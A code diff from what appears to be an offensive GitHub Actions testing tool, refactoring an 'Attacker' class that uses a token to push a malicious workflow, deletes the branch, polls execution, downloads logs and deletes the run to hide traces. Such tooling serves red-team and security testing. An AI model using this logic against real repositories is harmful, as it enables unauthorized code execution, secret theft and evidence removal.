@@ -44,7 +44,7 @@ class Attacker:
     async def setup_user_info(self):
         """ """
         if not self.user_perms:
-            self.user_perms = await self.api.check_user()
+            self.user_perms = await self.api.user.check_user()
             if not self.user_perms:
                 logger.error("This token cannot be used for attacks!")
                 return False
@@ -119,7 +119,7 @@ class Attacker:
         message = commit_message or "Test Commit"
 
         if self.author_email and self.author_name:
-            rev_hash = await self.api.commit_workflow(
+            rev_hash = await self.api.commit.commit_workflow(
                 target_repo,
                 branch,
                 yaml_contents.encode(),
@@ -129,7 +129,7 @@ class Attacker:
                 message=message,
             )
         else:
-            rev_hash = await self.api.commit_workflow(
+            rev_hash = await self.api.commit.commit_workflow(
                 target_repo,
                 branch,
                 yaml_contents.encode(),
@@ -144,7 +144,7 @@ class Attacker:
         Output.result("Succesfully pushed the malicious workflow!")
 
         for _ in range(self.timeout):
-            ret = await self.api.delete_branch(target_repo, branch)
+            ret = await self.api.commit.delete_branch(target_repo, branch)
             if ret:
                 break
             else:
@@ -158,7 +158,7 @@ class Attacker:
         Output.tabbed("Waiting for the workflow to queue...")
 
         for _i in range(self.timeout):
-            workflow_id = await self.api.get_recent_workflow(
+            workflow_id = await self.api.action.get_recent_workflow(
                 target_repo, rev_hash, yaml_name
             )
             if workflow_id == -1:
@@ -175,7 +175,7 @@ class Attacker:
         Output.tabbed("Waiting for the workflow to execute...")
 
         for _ in range(self.timeout):
-            status = await self.api.get_workflow_status(target_repo, workflow_id)
+            status = await self.api.action.get_workflow_status(target_repo, workflow_id)
             if status == -1:
                 Output.error("The workflow failed!")
                 break
@@ -220,7 +220,7 @@ class Attacker:
             else:
                 branch = target_branch
 
-            res = await self.api.get_repo_branch(target_repo, branch)
+            res = await self.api.commit.get_repo_branch(target_repo, branch)
             if res == -1:
                 Output.error("Failed to check for remote branch!")
                 return
@@ -241,14 +241,16 @@ class Attacker:
             if not workflow_id or workflow_id is False:
                 return False
 
-            res = await self.api.download_workflow_logs(target_repo, workflow_id)
+            res = await self.api.action.download_workflow_logs(target_repo, workflow_id)
             if not res:
                 Output.error("Failed to download logs!")
             else:
                 Output.result(f"Workflow logs downloaded to {workflow_id}.zip!")
 
             if delete_action:
-                res = await self.api.delete_workflow_run(target_repo, workflow_id)
+                res = await self.api.action.delete_workflow_run(
+                    target_repo, workflow_id
+                )
                 if not res:
                     Output.error("Failed to delete workflow!")
                 else:
